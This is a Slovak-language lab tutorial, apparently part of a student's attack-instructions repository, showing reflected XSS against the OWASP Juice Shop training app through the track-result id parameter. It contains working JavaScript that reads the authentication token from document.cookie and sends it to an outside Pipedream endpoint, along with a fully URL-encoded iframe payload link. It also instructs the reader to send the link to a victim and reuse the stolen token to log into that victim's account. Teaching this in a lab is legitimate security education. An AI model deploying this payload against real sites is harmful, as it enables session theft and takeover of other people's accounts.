# Reflected cross site scripting (XSS)

### Prostredie: Juice-Shop - https://github.com/juice-shop/juice-shop#from-sources

- Po spustení aplikácie a zaregistrovaní sa prejdeme do sekcii v menu "Objednávky a platby".
- V url sa nám zobrazujú objednávky podľa id, kde na obrazovke vyhľadanej objednávky sa taktiež zobrazuje id objednávky.
- Tento design pattern má potencionálnu zraniteľnosť a to, že vpisujeme neoverený vstup priamo do DOM stránky.
- V zdrojovom kóde juice-shopu v komponente track-result.component.html (angular komponent) je hodnota id vkladaná do DOM cez zraniteľnú metódu "innerHTML". To nám v prípade neoverenia vstupu umožňuje aplikovať reflected XSS útok.
- Do url parametru môžeme teda vložiť škodlivý kód a ten bude priamo vložený do tela stránky.
          const headers = new Headers();
          headers.append("Content-Type", "text/plain");

          const body = {
          test: "event",
          };

          const options = {
          method: "POST",
          headers,
          mode: "cors",
          body: document.cookie.split("")[4].split("=")[1],
          };

          fetch("https://eojph9o2kgja7k2.m.pipedream.net", options);`
- Tento kód vytvorí HTTP request na daný endpoint a odošle autentifikačný token z cookie súborov. Vytvoríme si vlastný endpoint v službe Pipedream (inštalácia https://pipedream.com/requestbin) a nahradíme náš vytovrený
  endpoint za hodnotu "https://eojph9o2kgja7k2.m.pipedream.net" v ukážkovom kóde. 
- Kód potrebujeme zakódovať tak, aby ho prehliadač vedel prijať ako validný parameter (online enkóder a dekóder - https://www.urlencoder.org/), potom vložiť do "iframe" tagu ako javascript reťazec a takto upravenú url môžeme vložiť do vyhladávania a spustiť.

          <a href="http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript%3Aconst%20headers%20%3D%20new%20Headers
              ()%3Bheaders.append(%60Content-Type%60%2C%20%60text%2Fplain%60)%3Bconst%20body%20%3D%20%7Btest%3A%20%60event%60
              %2C%7D%3Bconst%20options%20%3D%20%7Bmethod%3A%20%60POST%60%2Cheaders%2Cmode%3A%20%60cors%60%2Cbody%3A%20document
              .cookie.split(%60%20%60)%5B4%5D.split(%60%3D%60)%5B1%5D%7D%3Bfetch(%60https%3A%2F%2Feojph9o2kgja7k2.m.pipedream.
              net%60%2C%20options)%3B%22%3E%3C%2Fiframe%3E">
              http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript%3Aconst%20headers%20%3D%20new%20Headers
              ()%3Bheaders.append(%60Content-Type%60%2C%20%60text%2Fplain%60)%3Bconst%20body%20%3D%20%7Btest%3A%20%60event%60
              %2C%7D%3Bconst%20options%20%3D%20%7Bmethod%3A%20%60POST%60%2Cheaders%2Cmode%3A%20%60cors%60%2Cbody%3A%20document
              .cookie.split(%60%20%60)%5B4%5D.split(%60%3D%60)%5B1%5D%7D%3Bfetch(%60https%3A%2F%2Feojph9o2kgja7k2.m.pipedream.
              net%60%2C%20options)%3B%22%3E%3C%2Fiframe%3E"
          </a>
- Skopírovanú url môžeme poslať obetí a ťa, v prípade že je prihlásená v systéme, omylom odošle na nás endpoint autentifikačný token.
- Získaný token vložíme do local storageu aplikácie a týmto spôsobom sme sa prihlásili do účtu iného používateľa.

- Video návod sa nachádza v priečinku "video_instructions": /video_instructions/reflected-xss.mp4 (https://github.com/MatusVetrik/dp-attacks-instructions/blob/main/video_instructions/reflected-xss.mp4)
